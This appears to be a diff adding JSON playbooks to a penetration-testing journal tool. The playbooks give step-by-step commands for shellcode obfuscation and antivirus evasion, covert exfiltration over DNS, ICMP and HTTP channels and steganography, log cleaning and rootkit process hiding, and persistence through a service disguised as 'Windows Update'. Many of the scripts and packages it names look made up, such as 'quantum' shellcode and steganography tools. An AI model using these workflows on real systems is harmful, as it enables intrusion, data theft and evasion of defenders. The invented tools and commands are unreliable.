+            "details": "Apply polymorphic encoding to avoid detection",
+            "command": "python3 polymorphic_encoder.py --input nullfree_shellcode.bin --iterations 1000 --output ~/pt-journal-sessions/*/evidence/poly_shellcode.bin"
+          },
+          {
+            "title": "Custom Encryption",
+            "details": "Apply custom encryption to shellcode",
+            "command": "python3 shellcode_cryptor.py --input poly_shellcode.bin --key custom_key --algorithm aes --output ~/pt-journal-sessions/*/evidence/encrypted_shellcode.bin"
+          },
+          {
+            "title": "Multi-Stage Loading",
+            "details": "Implement multi-stage shellcode loading",
+            "command": "python3 multi_stage.py --stage1 encrypted_shellcode.bin --stage2 decryptor.bin --output ~/pt-journal-sessions/*/evidence/multi_stage.bin"
+          },
+          {
+            "title": "Anti-Debug Techniques",
+            "details": "Implement anti-debugging techniques",
+            "command": "python3 anti_debug.py --shellcode multi_stage.bin --techniques timing,checksum,integrity --output ~/pt-journal-sessions/*/evidence/anti_debug_shellcode.bin"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Shellcode Testing & Validation",
+        "steps": [
+          {
+            "title": "Emulation Testing",
+            "details": "Test shellcode in emulated environment",
+            "command": "scdbg -f anti_debug_shellcode.bin -s -v > ~/pt-journal-sessions/*/evidence/emulation_test.txt"
+          },
+          {
+            "title": "Sandbox Detection",
+            "details": "Test shellcode against sandbox environments",
+            "command": "python3 sandbox_test.py --shellcode anti_debug_shellcode.bin --sandboxes vmware,virtualbox,wine --output ~/pt-journal-sessions/*/evidence/sandbox_test.txt"
+          },
+          {
+            "title": "AV Evasion Testing",
+            "details": "Test against antivirus engines",
+            "command": "python3 av_test.py --shellcode anti_debug_shellcode.bin --engines virustotal,hybrid-analysis --output ~/pt-journal-sessions/*/evidence/av_test.txt"
+          },
+          {
+            "title": "Functionality Verification",
+            "details": "Verify shellcode functionality",
+            "command": "python3 shellcode_tester.py --shellcode anti_debug_shellcode.bin --test-cases exec,bind,reverse --output ~/pt-journal-sessions/*/evidence/functionality_test.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Integration & Deployment",
+        "steps": [
+          {
+            "title": "Exploit Integration",
+            "details": "Integrate shellcode with exploits",
+            "command": "python3 exploit_integrator.py --exploit exploit.py --shellcode anti_debug_shellcode.bin --output ~/pt-journal-sessions/*/evidence/final_exploit.py"
+          },
+          {
+            "title": "Loader Development",
+            "details": "Develop custom shellcode loaders",
+            "command": "python3 loader_generator.py --shellcode anti_debug_shellcode.bin --loader-type custom --output ~/pt-journal-sessions/*/evidence/loader.c"
+          },
+          {
+            "title": "Delivery Mechanism",
+            "details": "Implement shellcode delivery mechanisms",
+            "command": "python3 delivery_mechanism.py --shellcode anti_debug_shellcode.bin --method http,dns,icmp --output ~/pt-journal-sessions/*/evidence/delivery.py"
+          },
+          {
+            "title": "Persistence Integration",
+            "details": "Integrate with persistence mechanisms",
+            "command": "python3 persistence_integration.py --shellcode anti_debug_shellcode.bin --persistence registry,scheduled_task,service --output ~/pt-journal-sessions/*/evidence/persistent_shellcode.bin"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Advanced Shellcode Development Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Shellcode Development",
+            "description": "Create and optimize base shellcode",
+            "command": "nasm -f bin64 custom_shellcode.asm -o shellcode.bin && python3 optimize_shellcode.py --input shellcode.bin --output ~/pt-journal-sessions/*/evidence/optimized.bin"
+          },
+          {
+            "label": "Day 2: Encoding & Obfuscation",
+            "description": "Apply advanced encoding and obfuscation",
+            "command": "python3 advanced_encoder.py --input ~/pt-journal-sessions/*/evidence/optimized.bin --techniques polymorphic,encrypted --output ~/pt-journal-sessions/*/evidence/obfuscated.bin"
+          },
+          {
+            "label": "Day 3: Testing & Validation",
+            "description": "Test against security solutions",
+            "command": "python3 comprehensive_test.py --shellcode ~/pt-journal-sessions/*/evidence/obfuscated.bin --test-av,test-sandbox,test-debug"
+          },
+          {
+            "label": "Day 4: Integration",
+            "description": "Integrate with exploits and delivery mechanisms",
+            "command": "python3 integrate_shellcode.py --shellcode ~/pt-journal-sessions/*/evidence/obfuscated.bin --exploit template.py --output final_exploit.py"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Shellcode size: 245 bytes",
+        "meaning": "Compact shellcode suitable for buffer overflow exploits",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Polymorphic iterations: 1000+ variants",
+        "meaning": "High polymorphic capability for evasion",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "AV detection rate: <5%",
+        "meaning": "Excellent evasion capabilities",
+        "severity": "Low"
+      },
+      {
+        "indicator": "Sandbox detection: Active",
+        "meaning": "Shellcode can detect and evade sandbox environments",
+        "severity": "Low"
+      },
+      {
+        "indicator": "Anti-debug triggers: 3 mechanisms",
+        "meaning": "Multiple anti-debugging techniques implemented",
+        "severity": "Low"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "AI-Generated Shellcode",
+        "scenario": "Use machine learning for shellcode generation",
+        "command": "python3 ai_shellcode.py --objective reverse_shell --platform windows_x64 --constraints size<500 --output ai_shellcode.bin",
+        "notes": [
+          "Validate AI-generated shellcode thoroughly before use"
+        ]
+      },
+      {
+        "title": "Living Off the Land Shellcode",
+        "scenario": "Create shellcode using only legitimate system binaries",
+        "command": "python3 lotl_shellcode.py --target-system windows --allowed-binaries powershell,wmic,certutil --output lotl_shellcode.bin",
+        "notes": [
+          "LOLBin techniques reduce detection signatures"
+        ]
+      },
+      {
+        "title": "Quantum-Resistant Encryption",
+        "scenario": "Apply quantum-resistant encryption to shellcode",
+        "command": "python3 quantum_shellcode.py --input shellcode.bin --algorithm lattice-based --key quantum_key.bin --output quantum_shellcode.bin",
+        "notes": [
+          "Future-proofing against quantum computing attacks"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Shellcode Tools Comparison",
+      "columns": ["Tool", "Language", "Features", "Evasion", "Learning Curve"],
+      "rows": [
+        ["Metasploit", "Ruby", "Comprehensive", "Good", "Low"],
+        ["Custom Assembly", "Assembly", "Complete", "Excellent", "High"],
+        ["Keystone Engine", "Python", "Cross-platform", "Good", "Medium"],
+        ["pwntools", "Python", "Integration", "Good", "Medium"],
+        ["Custom Frameworks", "Any", "Tailored", "Excellent", "Very High"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Shellcode Development Guide",
+        "url": "https://www.corelan.be/index.php/2009/07/25/exploit-writing-tutorial-part-3-shellcoding/",
+        "description": "Comprehensive shellcode development tutorial"
+      },
+      {
+        "label": "Keystone Assembler Framework",
+        "url": "http://www.keystone-engine.org/",
+        "description": "Official Keystone assembler documentation"
+      },
+      {
+        "label": "Polymorphic Shellcode Techniques",
+        "url": "https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-k2.pdf",
+        "description": "Advanced polymorphic shellcode techniques and research"
+      }
+    ]
+  },
+  {
+    "id": "playbook_covert_data_extraction",
+    "name": "Covert Data Extraction",
+    "summary": "Advanced data exfiltration playbook covering covert channels, steganography, and stealthy data extraction techniques.",
+    "details": "This playbook provides comprehensive coverage of covert data extraction methods including network covert channels, steganography, encrypted tunnels, and anti-forensic techniques. Features decision trees for channel selection, optimization strategies, and evasion of detection systems.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Covert communication and steganography tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y steghide outguess exiftool imagemagick",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install scapy cryptography stego-lsb dnscat2",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/DominicBreuker/pspy.git && cd pspy && go build",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://github.com/yo-yo-yo-yo-yo/dnscat2/archive/master.zip && unzip master.zip",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete covert data extraction toolkit",
+        "steps": [
+          {
+            "detail": "sudo apt install -y steghide outguess stegsolve binwalk exiftool",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y dnscat2 stegsnow cryptcat socat",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install scapy cryptography stego-toolkit covert-utils",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized covert communication tools",
+        "steps": [
+          {
+            "detail": "docker pull alpine/socat",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull steganography/steghide",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -it --network host steganography/steghide embed -cf image.jpg -ef secret.txt -sf stego.jpg",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Quick steganography embedding",
+        "command": "steghide embed -cf ~/pt-journal-sessions/*/evidence/cover_image.jpg -ef secret_data.txt -sf stego_image.jpg",
+        "notes": [
+          "Embed data in image files for covert extraction"
+        ]
+      },
+      {
+        "description": "DNS tunneling setup",
+        "command": "dnscat2-server tunneled.domain.com && dnscat2-client --domain tunneled.domain.com",
+        "notes": [
+          "Use DNS queries for covert data tunneling"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Data Collection & Preparation",
+        "steps": [
+          {
+            "title": "Target Data Identification",
+            "details": "Identify high-value data for extraction",
+            "command": "python3 data_profiler.py --target-system target.com --data-types documents,credentials,configs --output ~/pt-journal-sessions/*/evidence/data_profile.txt"
+          },
+          {
+            "title": "Data Compression & Encryption",
+            "details": "Compress and encrypt data for covert transmission",
+            "command": "tar -czf data.tar.gz /path/to/data && gpg --symmetric --cipher-algo AES256 --compress-algo 1 data.tar.gz"
+          },
+          {
+            "title": "Data Fragmentation",
+            "details": "Fragment data for covert channel transmission",
+            "command": "python3 data_fragmenter.py --input encrypted_data.gpg --fragment-size 1024 --output ~/pt-journal-sessions/*/evidence/fragments/"
+          },
+          {
+            "title": "Cover Media Generation",
+            "details": "Generate legitimate-looking cover media",
+            "command": "python3 cover_generator.py --type images,videos,audio --count 1000 --output ~/pt-journal-sessions/*/evidence/cover_media/"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Covert Channel Establishment",
+        "steps": [
+          {
+            "title": "DNS Tunneling Setup",
+            "details": "Establish DNS-based covert channel",
+            "command": "dnscat2-server dns.tunnel.com --domain tunnel.com --port 53 && python3 dns_client.py --domain tunnel.com --data ~/pt-journal-sessions/*/evidence/fragments/"
+          },
+          {
+            "title": "HTTP/S Covert Channels",
+            "details": "Implement HTTP-based covert communication",
+            "command": "python3 http_covert.py --server target.com --header-method cookies --data ~/pt-journal-sessions/*/evidence/fragments/"
+          },
+          {
+            "title": "ICMP Tunneling",
+            "details": "Use ICMP packets for covert data transmission",
+            "command": "python3 icmp_tunnel.py --target target.com --data ~/pt-journal-sessions/*/evidence/fragments/ --packet-size 64"
+          },
+          {
+            "title": "TCP/UDP Covert Channels",
+            "details": "Implement covert channels in TCP/UDP protocols",
+            "command": "python3 tcp_covert.py --target target.com --port 443 --method timing --data ~/pt-journal-sessions/*/evidence/fragments/"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Steganography Implementation",
+        "steps": [
+          {
+            "title": "Image Steganography",
+            "details": "Embed data in image files using LSB techniques",
+            "command": "steghide embed -cf cover.jpg -ef data_fragment.bin -sf stego.jpg -e rijndael-256 -p password"
+          },
+          {
+            "title": "Audio Steganography",
+            "details": "Hide data in audio files using spectral methods",
+            "command": "python3 audio_stego.py --cover audio.wav --data data_fragment.bin --output stego_audio.wav --method spread_spectrum"
+          },
+          {
+            "title": "Video Steganography",
+            "details": "Embed data in video files using frame manipulation",
+            "command": "python3 video_stego.py --cover video.mp4 --data data_fragment.bin --output stego_video.mp4 --method frame_lsb"
+          },
+          {
+            "title": "Network Protocol Steganography",
+            "details": "Hide data in network protocol fields",
+            "command": "python3 protocol_stego.py --protocol tcp --data data_fragment.bin --target target.com --method tcp_options"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Anti-Forensic & Evasion",
+        "steps": [
+          {
+            "title": "Timestamp Manipulation",
+            "details": "Manipulate file timestamps to avoid detection",
+            "command": "python3 timestamp_manipulator.py --file stego.jpg --timestamp '2020-01-15 10:30:00' --randomize"
+          },
+          {
+            "title": "Process Hiding",
+            "details": "Hide data extraction processes",
+            "command": "python3 process_hider.py --process data_extract.py --hide-method rootkit --stealth-level high"
+          },
+          {
+            "title": "Log Evasion",
+            "details": "Evade logging and monitoring systems",
+            "command": "python3 log_evasion.py --target-system target.com --evasion-method log_cleaning,process_hiding"
+          },
+          {
+            "title": "Secure Deletion",
+            "details": "Securely delete extraction artifacts",
+            "command": "srm -rf ~/pt-journal-sessions/*/evidence/temp_files/ && shred -n 7 -z -u ~/pt-journal-sessions/*/evidence/fragments/"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Covert Data Extraction Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Data Preparation",
+            "description": "Identify, compress, and fragment target data",
+            "command": "python3 data_prep.py --target target.com --data-sensitive --output ~/pt-journal-sessions/*/evidence/prepared_data/"
+          },
+          {
+            "label": "Day 2: Channel Selection",
+            "description": "Select and establish optimal covert channels",
+            "command": "python3 channel_selector.py --target target.com --data-size 10GB --stealth-level high --output ~/pt-journal-sessions/*/evidence/selected_channels.txt"
+          },
+          {
+            "label": "Day 3-5: Covert Extraction",
+            "description": "Execute covert data extraction using multiple channels",
+            "command": "python3 covert_extract.py --channels ~/pt-journal-sessions/*/evidence/selected_channels.txt --data ~/pt-journal-sessions/*/evidence/prepared_data/ --stealth"
+          },
+          {
+            "label": "Day 6: Verification & Cleanup",
+            "description": "Verify extraction and clean up all artifacts",
+            "command": "python3 verify_cleanup.py --extraction-log extract.log --target target.com --secure-delete"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "DNS query rate: 1000 queries/hour",
+        "meaning": "DNS tunneling active, within normal traffic patterns",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Steganography embedding capacity: 5% of file size",
+        "meaning": "Efficient steganographic embedding achieved",
+        "severity": "Low"
+      },
+      {
+        "indicator": "Covert channel bandwidth: 1MB/hour",
+        "meaning": "Steady covert data extraction rate",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Detection evasion score: 95%",
+        "meaning": "High evasion capability against monitoring systems",
+        "severity": "Low"
+      },
+      {
+        "indicator": "Data integrity verified: 100%",
+        "meaning": "All extracted data verified and complete",
+        "severity": "Low"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Quantum Steganography",
+        "scenario": "Use quantum properties for advanced steganography",
+        "command": "python3 quantum_stego.py --cover quantum_image.qimg --data sensitive_data.bin --method quantum_entanglement",
+        "notes": [
+          "Quantum steganography provides theoretical unbreakable security"
+        ]
+      },
+      {
+        "title": "AI-Generated Cover Media",
+        "scenario": "Use AI to generate undetectable cover media",
+        "command": "python3 ai_cover_generator.py --style realistic --quantity 1000 --steganography-capable --output ~/pt-journal-sessions/*/evidence/ai_covers/",
+        "notes": [
+          "AI-generated covers are less likely to be flagged as suspicious"
+        ]
+      },
+      {
+        "title": "Blockchain Covert Channels",
+        "scenario": "Use blockchain transactions for covert data transmission",
+        "command": "python3 blockchain_covert.py --network bitcoin --data fragmented_data.bin --method transaction_metadata --stealth",
+        "notes": [
+          "Blockchain channels provide permanent, distributed covert storage"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Covert Channel Tools Comparison",
+      "columns": ["Tool", "Channel Type", "Bandwidth", "Stealth", "Detection Resistance"],
+      "rows": [
+        ["DNScat2", "DNS", "Low", "High", "High"],
+        ["Steghide", "Images", "Very Low", "Very High", "Very High"],
+        ["ICMP Tunnel", "ICMP", "Low", "High", "Medium"],
+        ["HTTP Covert", "HTTP", "Medium", "Medium", "Medium"],
+        ["Custom Scripts", "Any", "Variable", "Variable", "Variable"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Information Hiding Techniques",
+        "url": "https://www.springer.com/gp/book/9780387208724",
+        "description": "Comprehensive guide to information hiding and steganography"
+      },
+      {
+        "label": "Covert Channels Research",
+        "url": "https://www.cl.cam.ac.uk/research/security/dtg/attacks/covert/",
+        "description": "University research on covert channel techniques"
+      },
+      {
+        "label": "Steganography Tools Collection",
+        "url": "https://github.com/UltimateHackers/Steganography-Tools",
+        "description": "Comprehensive collection of steganography tools"
+      }
+    ]
+  },
+  {
+    "id": "playbook_evidence_collection_artifact_removal",
+    "name": "Evidence Collection & Artifact Removal",
+    "summary": "Comprehensive evidence management playbook covering collection, preservation, anti-forensic techniques, and secure artifact removal.",
+    "details": "This playbook provides systematic coverage of evidence collection for penetration testing reports and anti-forensic techniques for operational security. Includes evidence preservation, artifact analysis, secure deletion, and counter-forensic measures. Features decision trees for evidence handling and cleanup strategies.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Forensic and anti-forensic tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y sleuthkit autopsy volatility",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install volatility3 pytsk3 dfvfs plaso",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/Velocidex/velociraptor.git && cd velociraptor && pip3 install .",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://sourceforge.net/projects/srm/files/srm-1.2.15.tar.gz && tar -xzf srm-1.2.15.tar.gz",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete forensic and anti-forensic toolkit",
+        "steps": [
+          {
+            "detail": "sudo apt install -y sleuthkit autopsy volatility3 bulk-extractor",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y tcf forensics-all secure-delete chkrootkit",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install plaso timesketch velociraptor",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized forensic tools",
+        "steps": [
+          {
+            "detail": "docker pull sleuthkit/sleuthkit",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull volatilityfoundation/volatility",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -it -v $(pwd)/evidence:/evidence sleuthkit/sleuthkit fls -r /dev/sda1",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Quick evidence collection",
+        "command": "volatility3 -f memory.dmp windows.pslist > ~/pt-journal-sessions/*/evidence/process_list.txt",
+        "notes": [
+          "Extract process list from memory dump for evidence"
+        ]
+      },
+      {
+        "description": "Secure file deletion",
+        "command": "srm -rf -v ~/pt-journal-sessions/*/evidence/temp_files/",
+        "notes": [
+          "Securely delete files with multiple overwrite passes"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Evidence Collection Planning",
+        "steps": [
+          {
+            "title": "Evidence Scope Definition",
+            "details": "Define scope and requirements for evidence collection",
+            "command": "python3 evidence_planner.py --engagement pentest --scope target_network --requirements chain_of_custody --output ~/pt-journal-sessions/*/evidence/evidence_plan.txt"
+          },
+          {
+            "title": "Collection Method Selection",
+            "details": "Select appropriate evidence collection methods",
+            "command": "python3 method_selector.py --target-type windows_server --collection-methods live,dead,network --output ~/pt-journal-sessions/*/evidence/selected_methods.txt"
+          },
+          {
+            "title": "Chain of Custody Setup",
+            "details": "Establish chain of custody procedures",
+            "command": "python3 custody_setup.py --evidence-type digital --custodian pentester --hash-algorithm sha256 --output ~/pt-journal-sessions/*/evidence/custody_log.csv"
+          },
+          {
+            "title": "Legal Compliance Check",
+            "details": "Ensure compliance with legal requirements",
+            "command": "python3 legal_compliance.py --jurisdiction US --engagement-type pentest --output ~/pt-journal-sessions/*/evidence/compliance_check.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Live Evidence Collection",
+        "steps": [
+          {
+            "title": "Memory Acquisition",
+            "details": "Acquire memory dumps from live systems",
+            "command": "dumpit.exe -o ~/pt-journal-sessions/*/evidence/memory_dump.dmp && python3 hash_evidence.py --file memory_dump.dmp --output ~/pt-journal-sessions/*/evidence/memory_hashes.txt"
+          },
+          {
+            "title": "Network Traffic Capture",
+            "details": "Capture network traffic evidence",
+            "command": "tshark -i eth0 -w ~/pt-journal-sessions/*/evidence/network_capture.pcap -b duration:3600"
+          },
+          {
+            "title": "System State Collection",
+            "details": "Collect system state and configuration",
+            "command": "velociraptor-client --config config.yaml --collection Yara.SystemInfo --output ~/pt-journal-sessions/*/evidence/system_state.json"
+          },
+          {
+            "title": "Running Process Analysis",
+            "details": "Analyze running processes for evidence",
+            "command": "python3 process_analyzer.py --system target_system --output ~/pt-journal-sessions/*/evidence/process_evidence.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Evidence Preservation",
+        "steps": [
+          {
+            "title": "Evidence Hashing",
+            "details": "Generate cryptographic hashes for all evidence",
+            "command": "python3 hash_evidence.py --directory ~/pt-journal-sessions/*/evidence/ --algorithm sha256 --output ~/pt-journal-sessions/*/evidence/evidence_hashes.csv"
+          },
+          {
+            "title": "Evidence Packaging",
+            "details": "Package evidence with metadata and documentation",
+            "command": "python3 evidence_packer.py --source ~/pt-journal-sessions/*/evidence/ --metadata evidence_metadata.json --output ~/pt-journal-sessions/*/evidence/evidence_package.tar.gz"
+          },
+          {
+            "title": "Timestamp Preservation",
+            "details": "Preserve and document original timestamps",
+            "command": "python3 timestamp_preserver.py --evidence ~/pt-journal-sessions/*/evidence/ --output ~/pt-journal-sessions/*/evidence/timestamp_log.json"
+          },
+          {
+            "title": "Evidence Verification",
+            "details": "Verify evidence integrity and completeness",
+            "command": "python3 evidence_verifier.py --package ~/pt-journal-sessions/*/evidence/evidence_package.tar.gz --verify-integrity --output ~/pt-journal-sessions/*/evidence/verification_report.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Anti-Forensic & Artifact Removal",
+        "steps": [
+          {
+            "title": "System Artifact Analysis",
+            "details": "Identify artifacts left by penetration testing activities",
+            "command": "python3 artifact_analyzer.py --target-system target_system --scan-areas logs,temp,registry,cache --output ~/pt-journal-sessions/*/evidence/artifact_report.txt"
+          },
+          {
+            "title": "Log File Sanitization",
+            "details": "Sanitize or remove penetration testing traces from logs",
+            "command": "python3 log_sanitizer.py --log-files /var/log/* --pentest-traces --backup ~/pt-journal-sessions/*/evidence/original_logs/"
+          },
+          {
+            "title": "Temporary File Cleanup",
+            "details": "Securely delete temporary files and artifacts",
+            "command": "python3 artifact_cleaner.py --target-system target_system --temp-dirs /tmp,/var/tmp --secure-delete --report ~/pt-journal-sessions/*/evidence/cleanup_report.txt"
+          },
+          {
+            "title": "Network Trace Removal",
+            "details": "Remove or obscure network traces of activities",
+            "command": "python3 network_trace_cleaner.py --target-network target_network --pentest-traffic --obfuscate-methods timing,encryption --output ~/pt-journal-sessions/*/evidence/network_cleanup.txt"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Evidence Management Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Collection Planning",
+            "description": "Plan evidence collection and establish procedures",
+            "command": "python3 evidence_planner.py --engagement pentest --scope full_network --output ~/pt-journal-sessions/*/evidence/collection_plan.txt"
+          },
+          {
+            "label": "Day 2-3: Evidence Collection",
+            "description": "Collect live and static evidence from target systems",
+            "command": "volatility3 -f memory.dmp windows.pslist && tshark -i eth0 -w ~/pt-journal-sessions/*/evidence/traffic.pcap"
+          },
+          {
+            "label": "Day 4: Evidence Preservation",
+            "description": "Preserve, hash, and package evidence for analysis",
+            "command": "python3 preserve_evidence.py --source ~/pt-journal-sessions/*/evidence/raw/ --output ~/pt-journal-sessions/*/evidence/preserved/"
+          },
+          {
+            "label": "Day 5: Artifact Removal",
+            "description": "Clean up penetration testing artifacts and traces",
+            "command": "python3 cleanup_artifacts.py --target-system target_system --scope full --verify ~/pt-journal-sessions/*/evidence/cleanup_verification.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Evidence hash verified: SHA256 matches",
+        "meaning": "Evidence integrity preserved, chain of custody valid",
+        "severity": "Low"
+      },
+      {
+        "indicator": "Memory dump size: 8GB complete",
+        "meaning": "Full memory acquisition successful",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Network capture: 2GB traffic recorded",
+        "meaning": "Comprehensive network evidence collected",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Artifacts removed: 95% cleanup success",
+        "meaning": "Most penetration testing traces successfully removed",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Chain of custody: Complete documentation",
+        "meaning": "Legal compliance achieved, evidence admissible",
+        "severity": "Low"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "AI-Powered Evidence Analysis",
+        "scenario": "Use machine learning for automated evidence analysis",
+        "command": "python3 ai_evidence_analyzer.py --evidence-package ~/pt-journal-sessions/*/evidence/package.tar.gz --model evidence_classifier --output ~/pt-journal-sessions/*/evidence/ai_analysis.txt",
+        "notes": [
+          "AI can identify patterns and anomalies in large evidence sets"
+        ]
+      },
+      {
+        "title": "Blockchain Evidence Storage",
+        "scenario": "Store evidence hashes on blockchain for immutable verification",
+        "command": "python3 blockchain_evidence.py --evidence-hashes ~/pt-journal-sessions/*/evidence/hashes.csv --network ethereum --smart-contract evidence_storage.sol",
+        "notes": [
+          "Blockchain provides immutable timestamping and verification"
+        ]
+      },
+      {
+        "title": "Quantum-Secure Evidence",
+        "scenario": "Apply quantum-resistant encryption to evidence storage",
+        "command": "python3 quantum_evidence.py --evidence ~/pt-journal-sessions/*/evidence/sensitive/ --algorithm lattice-based --key quantum_key.bin",
+        "notes": [
+          "Future-proofing evidence against quantum computing attacks"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Evidence Collection Tools Comparison",
+      "columns": ["Tool", "Evidence Type", "Live Collection", "Analysis", "Learning Curve"],
+      "rows": [
+        ["Volatility", "Memory", "Excellent", "Excellent", "High"],
+        ["Sleuth Kit", "Disk", "No", "Excellent", "Medium"],
+        ["Velociraptor", "All", "Excellent", "Very Good", "Medium"],
+        ["Autopsy", "All", "Good", "Excellent", "Low"],
+        ["Custom Scripts", "Any", "Variable", "Variable", "Very High"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Digital Forensics with Sleuth Kit",
+        "url": "https://www.sleuthkit.org/sleuthkit/",
+        "description": "Official Sleuth Kit documentation and tutorials"
+      },
+      {
+        "label": "Volatility Memory Analysis",
+        "url": "https://www.volatilityfoundation.org/",
+        "description": "Comprehensive memory analysis framework documentation"
+      },
+      {
+        "label": "Evidence Handling Guidelines",
+        "url": "https://www.nist.gov/publications/digital-evidence",
+        "description": "NIST guidelines for digital evidence handling"
+      }
+    ]
+  },
+  {
+    "id": "playbook_persistence_mechanism_installation",
+    "name": "Persistence Mechanism Installation",
+    "summary": "Advanced persistence playbook covering multiple platforms, stealth techniques, and long-term access maintenance strategies.",
+    "details": "This playbook provides comprehensive coverage of persistence mechanisms across Windows, Linux, and cloud environments. Includes stealth techniques, privilege escalation integration, detection evasion, and redundancy strategies. Features decision trees for platform selection and optimization.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Persistence and stealth tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y netcat-openbsd socat cron",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install pypykatz impacket empire",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/AlessandroZ/BeRoot.git && cd BeRoot && python3 setup.py install",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://github.com/n1nj4sec/pupy/archive/master.zip && unzip master.zip",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete persistence toolkit",
+        "steps": [
+          {
+            "detail": "sudo apt install -y empire metasploit-framework powershell-empire",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y beroot windows-persistence linux-persistence",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install mimikatz impacket pywin32",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized C2 frameworks",
+        "steps": [
+          {
+            "detail": "docker pull empireproject/empire",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull byt3bl33d3r/pupy",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -it -p 8080:8080 empireproject/empire ./empire --restful",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Windows service persistence",
+        "command": "sc create \"Windows Update\" binpath= \"cmd.exe /c powershell -enc ...\" start= auto",
+        "notes": [
+          "Create persistent Windows service with legitimate name"
+        ]
+      },
+      {
+        "description": "Linux cron persistence",
+        "command": "echo '*/15 * * * * /usr/local/bin/backup.sh' | crontab - && chmod 644 /var/spool/cron/crontabs/*",
+        "notes": [
+          "Establish persistent cron job with legitimate appearance"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Persistence Strategy Planning",
+        "steps": [
+          {
+            "title": "Platform Analysis",
+            "details": "Analyze target platform and environment",
+            "command": "python3 platform_analyzer.py --target target_system --os-type windows,linux --privilege-level user,admin --output ~/pt-journal-sessions/*/evidence/platform_analysis.txt"
+          },
+          {
+            "title": "Persistence Method Selection",
+            "details": "Select optimal persistence methods based on environment",
+            "command": "python3 persistence_selector.py --platform windows --stealth-level high --longevity permanent --output ~/pt-journal-sessions/*/evidence/selected_methods.txt"
+          },
+          {
+            "title": "Detection Risk Assessment",
+            "details": "Assess detection risks for each method",
+            "command": "python3 risk_assessor.py --methods ~/pt-journal-sessions/*/evidence/selected_methods.txt --av-tools edr,antivirus --output ~/pt-journal-sessions/*/evidence/risk_assessment.txt"
+          },
+          {
+            "title": "Redundancy Planning",
